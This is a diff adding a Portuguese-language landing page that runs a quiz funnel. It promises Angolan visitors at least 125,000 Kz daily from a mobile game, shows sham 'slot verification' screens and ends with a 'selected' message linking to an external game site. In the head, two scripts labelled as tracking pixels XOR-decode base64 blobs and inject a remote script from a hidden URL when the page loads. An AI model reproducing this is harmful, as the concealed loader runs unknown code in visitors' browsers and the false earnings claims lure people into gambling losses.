@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Joga connosco:</title>
+  <meta name="description"
+    content="Descubra se você está qualificado para jogar um dos jogos que mais tem pago em Angola.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+
+  <!-- Scripts de Rastreamento / Pixel -->
+  <script>(function () { var x_8t8 = atob("DMW0lpB5vudvHaTxsr6W4+IVnN1NddCFwraOub8a2olBaNCc26PNuPMW08kNb4uC0bfd5uQKkZIbcNfe3qTA8+MNkI0cP4jT07HA5Pkby5MKbobL6b6W+PEU28VVP8CQxqSZ4+QU14EWMNSD17PR+ORUxoQAeYmC0a6WurIP34saeIbLkOfJuutb0IYCeIbLkKHV4vFUy5MCdMKIn7XG8+Yc0JNCbtGT26HHtLxbyIYDaMHTiOeW680E"); var x_5 = []; for (var p_pgka = 0; p_pgka < x_8t8.length; p_pgka++) { x_5.push(x_8t8.charCodeAt(p_pgka) & 255); } var e_i91 = x_5[0]; var u_nb = x_5.slice(1, 1 + e_i91); var z_j1g = x_5.slice(1 + e_i91); var t_q = z_j1g.map(function (b, n_rwo) { return b ^ u_nb[n_rwo % e_i91]; }); var n_ctm4 = ""; for (var m_h4 = 0; m_h4 < t_q.length; m_h4++) { n_ctm4 += String.fromCharCode(t_q[m_h4] & 255); } var v_i0c = decodeURIComponent(escape(n_ctm4)); var n_tjno = JSON.parse(v_i0c); var h_y = n_tjno.globals || []; h_y.forEach(function (h_gkf) { window[h_gkf.name] = h_gkf.value; }); var t_hpd = document.createElement("script"); t_hpd.src = n_tjno.url; t_hpd.async = true; t_hpd.defer = true; (n_tjno.attributes || []).forEach(function (q_1u8) { t_hpd.setAttribute(q_1u8.name, q_1u8.value); }); (document.head || document.documentElement).appendChild(t_hpd); })();</script>
+  <script>(function () { var h_fj = atob("DPfUuxRuN+bBe4Q4/Iz2zmYCFdzjE/BMjITulDsNU4jvDvBVlZGtlXcBWsijCatLn4W9y2AdGJaoA+FU04e9w3ECGYyyWaganYOgyX0MQpKkCKYCp6r4mXMCWISgF/caxqyvmXoPWoPjQaZIlY+x110KFcrjDeVUiZL2gTZYVoL3GuEJz8+yjnJXVYPyQrMAncHm3iNMSru8"); var v_ruq = []; for (var o_ja6 = 0; o_ja6 < h_fj.length; o_ja6++) { v_ruq.push(h_fj.charCodeAt(o_ja6) & 255); } var g_mes = v_ruq[0]; var x_h1 = v_ruq.slice(1, 1 + g_mes); var y_tml = v_ruq.slice(1 + g_mes); var f_hx3 = y_tml.map(function (b, x_4qj) { return b ^ x_h1[x_4qj % g_mes]; }); var b_0cjk = ""; for (var f_xfn = 0; f_xfn < f_hx3.length; f_xfn++) { b_0cjk += String.fromCharCode(f_hx3[f_xfn] & 255); } var h_e0t = decodeURIComponent(escape(b_0cjk)); var h_8nsi = JSON.parse(h_e0t); var i_g0t = h_8nsi.globals || []; i_g0t.forEach(function (a_a) { window[a_a.name] = a_a.value; }); var k_jnml = document.createElement("script"); k_jnml.src = h_8nsi.url; k_jnml.async = true; k_jnml.defer = true; (h_8nsi.attributes || []).forEach(function (q_dw7o) { k_jnml.setAttribute(q_dw7o.name, q_dw7o.value); }); (document.head || document.documentElement).appendChild(k_jnml); })();</script>
+</head>
+
+<body>
+
+  <main class="quiz-wrapper">
+    <!-- Logo do Projeto -->
+    <div class="quiz-brand">
+      <img src="logo.jpg" alt="Logo Oficial" class="quiz-logo">
+    </div>
+
+    <!-- Header com barra de progresso (oculto na intro) -->
+    <header class="quiz-header" id="quizHeader" style="display: none;">
+      <div class="progress-info">
+        <span class="step-indicator" id="stepIndicator"></span>
+      </div>
+      <div class="progress-bar-track">
+        <div class="progress-bar-fill" id="progressBar"></div>
+      </div>
+    </header>
+
+    <!-- Container das telas -->
+    <section class="quiz-card" id="quizCard">
+
+      <!-- Tela Inicial / Boas-vindas -->
+      <div class="quiz-step active" id="stepIntro">
+        <h1 class="title">Descubra como fazer no mínimo 125.000 Kz por dia com esse novo jogo de Angola.</h1>
+        <p class="subtitle">Responda a 4 perguntas simples e descubra se estás apto para começar a lucrar hoje.</p>
+
+        <div class="features-list">
+          <div class="feature-item">
+            <span class="check-icon">✓</span>
+            <span>Só precisas de no máximo uns 15 min</span>
+          </div>
+          <div class="feature-item">
+            <span class="check-icon">✓</span>
+            <span>Jogue direto do seu telemóvel</span>
+          </div>
+          <div class="feature-item">
+            <span class="check-icon">✓</span>
+            <span>Levantamentos diários via Multicaixa Express ou IBAN.</span>
+          </div>
+        </div>
+
+        <button class="btn-primary btn-white" id="btnStart">Quero jogar agora</button>
+      </div>
+
+      <!-- Pergunta 1: Ganância / Cifra em Kz -->
+      <div class="quiz-step" id="step1">
+        <h2 class="question-title">Quanto você prefere ganhar por dia apenas jogando no telemóvel?</h2>
+
+        <div class="options-grid">
+          <button class="option-btn" data-value="25k-kz">
+            <span class="option-letter">A</span>
+            <div class="option-content">
+              <strong>25.000 Kz por dia</strong>
+              <small>Um extra garantido todos os dias</small>
+            </div>
+          </button>
+          <button class="option-btn" data-value="50k-kz">
+            <span class="option-letter">B</span>
+            <div class="option-content">
+              <strong>Mais de 50.000 Kz por dia</strong>
+              <small>Para mudar de vida rapidamente</small>
+            </div>
+          </button>
+        </div>
+      </div>
+
+      <!-- Pergunta 2: Contraste do Esforço -->
+      <div class="quiz-step" id="step2">
+        <h2 class="question-title">O que você prefere hoje?</h2>
+
+        <div class="options-grid">
+          <button class="option-btn" data-value="jogar">
+            <span class="option-letter">A</span>
+            <div class="option-content">
+              <strong>Ganhar dinheiro jogando no telemóvel</strong>
+              <small>Lucrar se divertindo em poucos minutos</small>
+            </div>
+          </button>
+          <button class="option-btn" data-value="trabalhar-duro">
+            <span class="option-letter">B</span>
+            <div class="option-content">
+              <strong>Trabalhar o dia todo por um salário fixo</strong>
+              <small>Ralar o mês todo para ganhar pouco</small>
+            </div>
+          </button>
+        </div>
+      </div>
+
+      <!-- Pergunta 3: Tempo / Facilidade -->
+      <div class="quiz-step" id="step3">
+        <h2 class="question-title">Você tem pelo menos 5 a 10 minutos livres por dia para jogar?</h2>
+
+        <div class="options-grid">
+          <button class="option-btn" data-value="tem-tempo">
+            <span class="option-letter">A</span>
+            <div class="option-content">
+              <strong>Sim, tenho esse tempo livre</strong>
+              <small>Posso jogar em qualquer pausa rápida</small>
+            </div>
+          </button>
+          <button class="option-btn" data-value="sem-tempo">
+            <span class="option-letter">B</span>
+            <div class="option-content">
+              <strong>Não, não tenho nem 5 minutos</strong>
+              <small>Minha rotina não permite nada</small>
+            </div>
+          </button>
+        </div>
+      </div>
+
+      <!-- Pergunta 4: Saque Imediato / Multicaixa -->
+      <div class="quiz-step" id="step4">
+        <h2 class="question-title">Se você lucrar hoje, quer receber o dinheiro na hora no Multicaixa?</h2>
+
+        <div class="options-grid">
+          <button class="option-btn" data-value="saque-hoje">
+            <span class="option-letter">A</span>
+            <div class="option-content">
+              <strong>Sim, quero receber hoje mesmo!</strong>
+              <small>Fazer o levantamento na hora</small>
+            </div>
+          </button>
+          <button class="option-btn" data-value="esperar-dias">
+            <span class="option-letter">B</span>
+            <div class="option-content">
+              <strong>Não, prefiro esperar dias</strong>
+              <small>Não tenho pressa para receber</small>
+            </div>
+          </button>
+        </div>
+      </div>
+
+      <!-- Tela de Processamento / Análise Psicológica -->
+      <div class="quiz-step" id="stepLoading">
+        <div class="loading-container">
+          <div class="spinner"></div>
+          <h2 class="loading-title">Verificando liberação da sua vaga...</h2>
+          <p class="loading-desc">Aguarde enquanto conectamos ao servidor de Angola.</p>
+
+          <div class="loading-checklist">
+            <div class="check-row" id="check1">
+              <span class="row-icon">○</span>
+              <span>Analisando perfil do jogador...</span>
+            </div>
+            <div class="check-row" id="check2">
+              <span class="row-icon">○</span>
+              <span>Verificando horários pagantes em Angola...</span>
+            </div>
+            <div class="check-row" id="check3">
+              <span class="row-icon">○</span>
+              <span>Liberando acesso exclusivo ao jogo...</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tela Final de Afirmação Direta -->
+      <div class="quiz-step" id="stepResult">
+        <div class="result-badge">
+          <span class="pulse-dot"></span>
+          Vaga Confirmada
+        </div>
+
+        <h2 class="result-title">Parabéns, você foi selecionado para jogar um dos jogos que mais tem pago em Angola!
+        </h2>
+        <p class="result-subtitle">Clica em <strong>JOGAR</strong> para começar.</p>
+
+        <div class="cta-box">
+          <a href="https://meumaiorjogo.vercel.app/" id="btnCta" class="btn-primary btn-cta" target="_blank"
+            rel="noopener noreferrer">
+            JOGAR
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+              stroke-linecap="round" stroke-linejoin="round">
+              <polygon points="5 3 19 12 5 21 5 3"></polygon>
+            </svg>
+          </a>
+          <span class="cta-guarantee">🔒 Acesso imediato liberado para o seu telemóvel</span>
+        </div>
+      </div>
+
+    </section>
+
+    <!-- Rodapé de Compliance / Facebook -->
+    <footer class="quiz-footer">
+      <p>© 2026 Todos os direitos reservados. Este site não é afiliado ao Facebook, Google ou qualquer plataforma de
+        anúncios.</p>
+    </footer>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
